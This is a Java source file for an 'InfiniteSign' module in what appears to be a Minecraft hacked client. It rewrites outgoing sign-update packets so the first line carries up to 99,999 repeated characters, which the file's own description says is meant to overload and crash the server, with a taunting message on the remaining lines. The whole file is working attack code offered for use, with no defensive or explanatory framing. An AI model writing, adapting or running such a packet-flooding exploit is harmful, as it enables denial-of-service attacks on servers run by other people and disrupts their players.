package me.ht9.rose.feature.module.modules.exploit.infinitesign;

import me.ht9.rose.event.bus.annotation.SubscribeEvent;
import me.ht9.rose.event.events.PacketEvent;
import me.ht9.rose.feature.module.Module;
import me.ht9.rose.feature.module.annotation.Description;
import me.ht9.rose.feature.module.setting.Setting;
import net.minecraft.src.Packet130UpdateSign;

@Description("Overloads sign packets to lobotomize the server. 99,999 chars of pure chaos.")
public final class InfiniteSign extends Module {
    // FIX 1: Add the missing instance field
    private static final InfiniteSign instance = new InfiniteSign();

    private final Setting<Integer> power = new Setting<>("Payload Size", 1000, 99999, 100000);
    private final Setting<String> character = new Setting<>("Char", "a");
    private final Setting<Boolean> autoPlace = new Setting<>("Auto-Nuke", true);

    // FIX 2: Add the missing instance() method for Registry.java to find
    public static InfiniteSign instance() {
        return instance;
    }

    @SubscribeEvent
    public void onPacket(PacketEvent event) {
        if (event.packet() instanceof Packet130UpdateSign packet) {
            // FIX 3: Use StringBuilder instead of .repeat() for Java 8 compatibility
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < power.value(); i++) {
                sb.append(character.value());
            }
            String nuke = sb.toString();
            
            packet.signLines = new String[] {
                nuke,           // Line 1: The Payload
                "HAS",          // Line 2: The
                "ABANDONED",    // Line 3: Message
                "YOU"           // Line 4: Of Doom
            };
        }
    }
}
